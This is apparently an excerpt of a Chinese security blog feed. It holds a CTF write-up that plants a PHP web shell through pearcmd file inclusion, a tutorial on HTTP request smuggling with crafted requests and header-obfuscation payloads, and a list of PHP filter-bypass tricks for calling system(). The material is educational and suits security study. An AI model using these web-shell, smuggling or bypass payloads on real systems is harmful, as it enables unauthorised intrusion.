class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>提示信息phpinfo.php</p><p>访问</p><p><img src="/../images/image-20231223164741894.png" alt="image-20231223164741894"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake&#123;Check_register_argc_argv&#125;</span><br></pre></td></tr></table></figure><p>看看register_argc_argv</p><p><img src="/../images/image-20231223164815465.png" alt="image-20231223164815465"></p><p>为On</p><p>尝试构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#x27;a&#x27;])?&gt;+./a.php</span><br></pre></td></tr></table></figure><p>但是要注意，直接get传参url会把&lt;等字符进行编码，可以使用burp</p><p><img src="/../images/image-20231223165900712.png" alt="image-20231223165900712"></p><p>直接读flag</p><p><img src="/../images/image-20231223165945181.png" alt="image-20231223165945181"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pear&quot;&gt;&lt;a href=&quot;#pear&quot; class=&quot;headerlink&quot; title=&quot;pear&quot;&gt;&lt;/a&gt;pear&lt;/h1&gt;&lt;p&gt;pear全称PHP Extension and Application Reposition(php扩展和应用仓库)，在do</summary>
      
    
    
    
    
    <category term="ctf web安全" scheme="http://example.com/tags/ctf-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>http请求走私</title>
    <link href="http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>http://example.com/2023/12/22/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2023-12-22T07:17:54.000Z</published>
    <updated>2023-12-22T07:26:55.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是HTTP请求走私"><a href="#什么是HTTP请求走私" class="headerlink" title="什么是HTTP请求走私"></a>什么是HTTP请求走私</h1><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列方式的技术。</p><p>攻击者可以绕过安全控制，未经授权直接访问敏感数据。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><h2 id="keep-alive与pipeline"><a href="#keep-alive与pipeline" class="headerlink" title="keep-alive与pipeline"></a>keep-alive与pipeline</h2><p>为了缓解源站的压力，一般会在用户和后端服务器之间加设前置服务器，用以缓存、简单校验、负载均衡等，而前置服务器与后端服务器往往是在可靠的网络域中，ip也是相对固定的，所以可以重用TCP连接来减少频繁TCP握手带来的开销，这就用到了HTTP1.1中的<strong>keep-alive</strong>和<strong>pipeline</strong>特性</p><ul><li>keep-alive:在HTTP请求中增加一个特殊的请求头Connection:keep-alive，告诉服务器接收完这次HTTP请求后，不要关闭TCP链接，以便于后面对相同服务器请求时重用这一个TCP链接。这样一来只需要进行一次TCP握手，减少了服务器的开销，这个特性在HTTP1.1中默认开启。</li><li>pipeline:基于keep-alive实现，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应。服务器接收请求后，需要遵循先入后出机制，将请求和响应严格对应，再将响应发送给客户端。目前浏览器默认不开启pipeline，但一般服务器都支持。</li></ul><p>正常情况下的HTTP请求:</p><p><img src="/../images/image-20231222152631080.png" alt="image-20231222152631080"></p><p>前置服务器与后端服务器应当在HTTP请求的边界划分上达成一致，否则会导致异常</p><p><img src="/../images/image-20231222152650380.png" alt="image-20231222152650380"> </p><h2 id="走私攻击实现"><a href="#走私攻击实现" class="headerlink" title="走私攻击实现"></a>走私攻击实现</h2><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器实现方式不同，可能代理服务器认为这是一个正常的HTTP请求，然后将其转发给了后端的源站服务器。但源站服务器经过解析处理后，只认为其中一部分为正常请求，剩下的另一部分则是走私的请求，当这部分请求对正常用户的请求造成影响后，就实现了HTTP请求走私攻击。</p><h2 id="CL与TE"><a href="#CL与TE" class="headerlink" title="CL与TE"></a>CL与TE</h2><p>CL：<strong>Content-Length</strong></p><p>TE：<strong>Transfer-Encoding</strong></p><p><strong>Transfer-Encoding</strong>指定用于传输请求主体的编码方式，可以使用的值有chunked,compress,deflate,gzip,identity</p><p>设置了<strong>Transfer-Encoding: chunked</strong>后，请求主体按一系列块的形式发送，并省略<strong>Content-Length</strong>。在每个块的开头需要使用十六进制数知名当前块的长度，数值后接<strong>\r\n</strong>(两个字节)，再接<strong>\r\n</strong>表示此块的结束。最后使用长度为0的块表示终止块。终止块后是一个tralier，由0或多个实体头组成 ，可以用来存放对数据的数字签名。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q=smuggling</span><br><span class="line">6</span><br><span class="line">hahaha</span><br><span class="line">0</span><br><span class="line">[空白行]</span><br><span class="line">[空白行]</span><br></pre></td></tr></table></figure><p><strong>注意:</strong></p><ul><li><strong>Content-Length</strong>需要将请求主体中的<strong>\r\n</strong>所占的两个字节计算在内，而块长度要忽略块内容表示终止的<strong>\r\n</strong></li><li>请求头与请求主体之间有一个空行，是规范要求的结构，不计入<strong>Content-Length</strong></li></ul><h1 id="走私方式"><a href="#走私方式" class="headerlink" title="走私方式"></a>走私方式</h1><p>HTTP请求走私攻击涉及将<strong>Content-Length</strong>标头和<strong>Transfer-Encoding</strong>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。</p><ul><li><p>CL.TE：前端服务器使用Content-Length标头，后端服务器使用Transfer-Encoding标头</p></li><li><p>TE.CL：前端服务器使用Transfer-Encoding标头，后端服务器使用Content-Length标头</p></li><li><p>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理</p></li></ul><h2 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h2><p>所有不携带请求体的HTTP请求都有可能受此影响。</p><p>前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略GET请求中的<strong>Content-Length</strong>头，不进行处理。</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>攻击流程：</strong></p><p>前端服务器收到该请求，读取<strong>Content-Length</strong>，判断这是一个完整的请求，转发给后端服务器</p><p>而后端服务器不对<strong>Content-Length</strong>作处理，由于pipeline存在，后端服务器认为这是两个请求</p><p>1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p><strong>RFC7320规范</strong></p><p>规定当服务器收到的请求中包含两个Content-Length而且两者的值不同时，需要返回400错误</p><p>有些服务器不会严格实现该规范，假设中间的代理服务器和后端的源服务器在收到类似请求时，都不会返回400，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源服务器按照第二个Content-Length的值进行处理</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>攻击流程：</strong></p><p>中间代理服务器获取到的数据包的长度为8，然后转发给后端源站服务器</p><p>而后端服务器获取到的数据包长度为7，后端服务器认为已经读取完毕，然后生成响应</p><p>而此时的缓冲区还剩余一个字母a，对于后端服务器来说这个a是下一个请求的一部分</p><p>如果此时另一用户发送请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>因为代理服务器和源服务器之间重用TCP链接，那么a会拼接到这个请求前面</p><p>实际请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br></pre></td></tr></table></figure><p>这样就实现了一次HTTP走私攻击，而且还可以扩展成类似CSRF的攻击方式</p><p>一般服务器都不会接收这种存在两个请求头的请求方式，但是</p><p><strong>RFC2616规范</strong></p><p>如果收到同时存在Content-Length和Transfer-Encoding这两个请求包时，必须忽略Content-Length</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>当收到存在两个请求头的请求包时，前端服务器只处理Content-Length请求头，后端服务器遵守RFC2616规定，忽略Content-Length，只处理Transfer-Encoding</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p><strong>攻击流程</strong></p><p>前端服务器处理Content-Length，所以这是一个完整的请求，请求体长度为6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>而后端服务器处理Transfer-Encoding，当它读到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为已经结束</p><p>a留在了缓冲区，会拼接到下一次请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>服务器解析时会报错，造成请求走私</p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>当收到存在两个请求头的请求包时，前端服务器处理Transfer-Encoding，后端服务器处理Content-Length</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>前端服务器处理Transfer-Encoding，当读到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为读取完毕，转发给后端服务器</p><p>后端服务器处理Content-Length，读完</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure><p>认为请求结束，后面数据认为是下一个请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>造成请求走私</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>当收到存在两个请求包时，前后端服务器都处理Transfer-Encoding请求头。</p><p>我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，使得另一个服务器不处理TE，在某种意义上还是CL-TE或TE-CL</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">Transfer-encoding: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line">5c\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p><strong>攻击流程：</strong></p><p>前端服务器处理Transfer-Encoding，读到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为结束，然后转发给后端服务器处理Transfer-Encoding</p><p>后端服务器读到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure><p>认为读取完毕，后面数据就是另一个请求</p><p>其他可用于混淆的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding[空格]: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[空格]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul><li>禁用代理服务器与后端服务器之间的TCP连接重用</li><li>使用HTTP&#x2F;2协议</li><li>前后端使用相同参数</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是HTTP请求走私&quot;&gt;&lt;a href=&quot;#什么是HTTP请求走私&quot; class=&quot;headerlink&quot; title=&quot;什么是HTTP请求走私&quot;&gt;&lt;/a&gt;什么是HTTP请求走私&lt;/h1&gt;&lt;p&gt;HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求</summary>
      
    
    
    
    
    <category term="http" scheme="http://example.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>php代码执行绕过方法总结</title>
    <link href="http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/12/21/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-21T12:20:53.000Z</published>
    <updated>2023-12-21T12:24:39.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string $code):mixed</span><br></pre></td></tr></table></figure><p>将code当作php代码执行</p><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>php5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,string $description]):bool</span><br></pre></td></tr></table></figure><p>php7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(mixed $assertion [,Throwable $exception]):bool</span><br></pre></td></tr></table></figure><p>assert()会检查指定的assertion，如果assertion是字符串，将会被当作代码执行</p><h3 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+&#x2F;e"></a>preg_replace()+&#x2F;e</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>执行正则表达式的搜索和替换</p><p>搜索<strong>subject</strong>中匹配<strong>pattern</strong>的部分，并用replacement替换。</p><p>如果<strong>pattern</strong>模式修饰符使用**&#x2F;e<strong>，那么匹配成功后</strong>replacement**会被当作代码执行</p><p><img src="/../images/image-20231220221711422.png" alt="image-20231220221711422"></p><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(string $args, string $code):string</span><br></pre></td></tr></table></figure><p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。</p><p>可对参数或函数体闭合注入恶意代码导致代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$id</span>.<span class="variable">$a</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;;&#125;phpinfo();//</span><br></pre></td></tr></table></figure><h2 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , array $array , array ...$arrays ) : array</span><br></pre></td></tr></table></figure><p><strong>array_map()<strong>返回一个</strong>array</strong>，数组内容为<strong>array1</strong>的元素按索引顺序为参数调用<strong>callback</strong>后的结果(有更多数组时还会传入arrays)，<strong>callback</strong>函数形参的数量必须匹配**array_map()**实参中数组的数量。</p><p><img src="/../images/image-20231220223642972.png" alt="image-20231220223642972"></p><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><p>第一个参数<strong>callback</strong>是被调用的回调函数，其余参数是回调函数的参数</p><p><img src="/../images/image-20231220225437826.png" alt="image-20231220225437826"></p><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , array $param_arr ) : mixed</span><br></pre></td></tr></table></figure><p>把第一个参数当作回调函数<strong>callback</strong>调用，把参数数组<strong>param_arr</strong>当作回调函数的参数传入</p><p><img src="/../images/image-20231220225711603.png" alt="image-20231220225711603"></p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</span><br></pre></td></tr></table></figure><p>依次将<strong>array</strong>数组中的每个值传递到<strong>callback</strong>函数，如果<strong>callback</strong>函数返回true，则<strong>array</strong>数组当前值会被包含在返回结果数组中，数组的键名保持不变。</p><p><img src="/../images/image-20231220230053947.png" alt="image-20231220230053947"></p><h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort ( array &amp;$array , callable $value_compare_func ) : bool</span><br></pre></td></tr></table></figure><p>将用户自定义的比较函数对数组中的值进行排序。</p><p>如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p><p>php&lt;5.6</p><p><img src="/../images/image-20231221154951752.png" alt="image-20231221154951752"></p><p><strong>php&gt;&#x3D;5.6&amp;php&lt;7  参数变长特性</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221090947163.png" alt="image-20231221090947163"></p><h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>适用于绕过过滤具体关键字</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo|system/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no hack!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221160046354.png" alt="image-20231221160046354"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(p.h.p.i.n.f.o)();</span><br><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">(sy.(st).em)(who.ami);</span><br><span class="line">(s.y.s.t.e.m)(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><h2 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h2><p><strong>PHP&gt;&#x3D;7</strong></p><p>以八进制表示的[0-7]{1,3}\转义字符会自动匹配byte(如”\400”&#x3D;&#x3D;”\000”)</p><p>以十六进制表示的\x[0-9A-Fa-f]{1,2}\转义字符表示法(如”\41”)</p><p>以Unicode表示的\u{[0-9A-Fa-f]+}字符，会输出UTF-8字符串</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;();#phpinfo();</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&#x27;whoami&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\u&#123;73&#125;\u&#123;79&#125;\u&#123;73&#125;\u&#123;74&#125;\u&#123;65&#125;\u&#123;6d&#125;&quot;(&#x27;id&#x27;);#system(&#x27;whoami&#x27;);</span><br><span class="line">&quot;\163\171\163\164\145\155&quot;(&quot;\167\150\157\141\155\151&quot;);#system(&#x27;whoami&#x27;);</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192218854.png" alt="image-20231221192218854"></p><h2 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h2><p><strong>过滤引号，可以使用以下方法</strong></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1=system&amp;2=whoami</span><br><span class="line">POST：</span><br><span class="line">cmd=$_GET[1]($_GET[2]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221192738080.png" alt="image-20231221192738080"></p><p>payload：</p><figure class="highlight 